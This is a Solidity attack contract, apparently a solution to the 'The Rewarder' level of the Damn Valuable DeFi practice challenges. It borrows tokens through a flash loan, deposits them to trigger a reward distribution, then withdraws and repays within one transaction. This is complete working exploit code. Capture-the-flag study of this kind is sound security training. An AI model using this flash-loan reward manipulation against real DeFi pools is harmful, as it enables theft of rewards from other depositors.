pragma solidity ^0.6.0;
import "../the-rewarder/FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import "../the-rewarder/TheRewarderPool.sol";

contract AttackTheRewarder {
    address payable public attacker;
    FlashLoanerPool public flashLoanerPool;
    DamnValuableToken public damnValuableToken;
    TheRewarderPool public theRewarderPool;

    constructor(
        address _flashLoanerPool,
        address _damnValuableToken,
        address _theRewarderPool
    ) public {
        attacker = msg.sender;
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        damnValuableToken = DamnValuableToken(_damnValuableToken);
        theRewarderPool = TheRewarderPool(_theRewarderPool);
    }

    function loan(uint256 _amount) external {
        flashLoanerPool.flashLoan(_amount);
    }

    function receiveFlashLoan(uint256 _amount) external {
        damnValuableToken.approve(address(theRewarderPool), _amount);
        theRewarderPool.deposit(_amount);
        theRewarderPool.distributeRewards();
        theRewarderPool.withdraw(_amount);
        damnValuableToken.transfer(address(flashLoanerPool), _amount);
    }
}
